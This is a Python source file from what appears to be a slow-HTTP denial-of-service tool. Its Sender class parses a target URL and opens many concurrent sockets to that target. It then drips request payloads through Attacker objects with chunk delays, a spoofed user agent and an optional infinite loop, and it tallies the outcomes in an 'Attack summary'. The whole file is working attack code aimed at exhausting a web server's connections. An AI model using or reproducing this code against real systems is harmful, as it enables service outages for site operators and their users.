from urllib.parse import urlparse
import socket
import threading
import time

from logger import *
from rqgen import *
from attacker import Attacker

class Sender:
    def __init__(self, options):
        self.options = options
        self.parsed_url = urlparse(options['url'])
        self.attackers = None
        self.pending_sockets = None
        self.stopped = False
        self.stats = {
            'successful': 0,
            'killed': 0,
            'pending': 0,
            'refused': 0
        }

        if not self.parsed_url.netloc:
            Logger.error('Invalid URL provided, specify url in format: http://targetsite.com:1234')
            exit(1)

        net_location = self.parsed_url.netloc
        host_port = net_location.split(':')
        self.host = host_port[0]
        self.port = 80
        self.path = self.parsed_url.path if self.parsed_url.path else '/'
        if len(host_port) == 2: # url has also port info
            self.port = int(host_port[1])

        self.rqgen = RqGen(self.options['method'].upper(), self.parsed_url.netloc, self.path, options['spoof-user-agent'], options['bodylen'])


    def create_socket(self):
        return socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def create_n_sockets(self):
        socks = []
        for i in range(self.options['concurrent_connections']):
            try:
                socks.append(self.create_socket())
            except OSError as ex:
                Logger.error('Cannot create socket: ' + str(ex))
                exit(1)
        return socks

    def test_conn(self):
        Logger.info('Testing connection to remote server...')
        sock = self.create_socket()
        try:
            sock.connect((self.host, self.port))
            sock.close()
            Logger.info('Test connection success!')
            return True
        except Exception as ex:
            Logger.error('Cannot connect to remote server: ' + str(ex))
            return False


    def attack(self):
        while True: # breaks after first if not infinite
            self.pending_sockets = self.create_n_sockets()
            self.attackers = []

            Logger.info('Initializing connections and starting attack job')

            job = threading.Thread(target=self.attack_job, daemon=True)
            job.start()
            try:
                while len(self.pending_sockets):
                    sock = self.pending_sockets.pop()
                    try:
                        sock.connect((self.host, self.port))
                        self.attackers.append(Attacker(sock, self.rqgen.payload(), self.options['chunk_size']))
                    except socket.error as ex:
                        Logger.info('Cannot create connection to remote host: ' + str(ex))
                        self.stats['refused'] += 1

                job.join()
            except KeyboardInterrupt:
                self.stopped = True
                Logger.log('Stopping attack...')
                self.print_stats()
                exit(0)

            if not self.options['infinite']:
                break

        self.print_stats()


    def attack_job(self):
        while not self.stopped and (len(self.attackers) or len(self.pending_sockets)):
            #Logger.info('Job status: {} attackers, {} pending'.format(len(self.attackers), len(self.pending_sockets)))
            for attacker in self.attackers:
                if attacker.is_done:
                    if attacker.killed_prematurely:
                        self.stats['killed'] += 1
                    else:
                        self.stats['successful'] += 1
                    self.attackers.remove(attacker)
                else:
                    attacker.execute_step()
            time.sleep(self.options['chunk_delay'] / 1000)

            if not len(self.attackers):
                time.sleep(0.001) # dont burn processor if there are no attackers provided yet

    def print_stats(self):
        Logger.log("Attack summary:\n      Successful requests: {}\n      Killed by remoted host: {}\n      Pending connections: {}\n      Refused connections: {}"
            .format(self.stats['successful'], self.stats['killed'], self.stats['pending'], self.stats['refused']))












#
